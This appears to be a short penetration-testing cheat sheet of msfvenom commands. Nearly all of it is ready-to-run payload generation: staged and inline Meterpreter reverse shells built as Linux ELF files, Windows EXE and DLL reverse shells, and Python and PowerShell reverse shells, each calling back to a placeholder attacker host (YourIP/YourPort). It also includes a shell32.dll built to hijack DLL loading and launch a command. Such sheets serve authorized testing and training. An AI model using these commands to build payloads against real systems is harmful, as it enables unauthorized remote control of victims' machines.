#### Executable formats

```
asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
```

#### Transform formats

```
bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```

#### Staged Meterpreter

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f elf > shell-meterp.elf
```

#### Inline Meterpreter

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f elf > santas.elf
```

#### Executable with Meterpreter

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe > shell-meterp.exe
```

#### Executable with Windows cmd

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe > shell-cmd.exe
```

#### Windows DLL with Windows cmd

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f dll > shell-cmd.dll
```

#### Execute Windows Command - génère une dll shell32.dll qui lance calc.exe

```bash
msfvenom -f dll -p windows/exec CMD="C:\windows\system32\calc.exe" -o shell32.dll
```

#### Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=YourIP LPORT=YourPort -f raw
```

#### Powershell

```bash
msfvenom -p windows/powershell_reverse_tcp LHOST=YourIP LPORT=YourPort -f raw
```

#### List encoders

```bash
msfvenom -l encoders
```
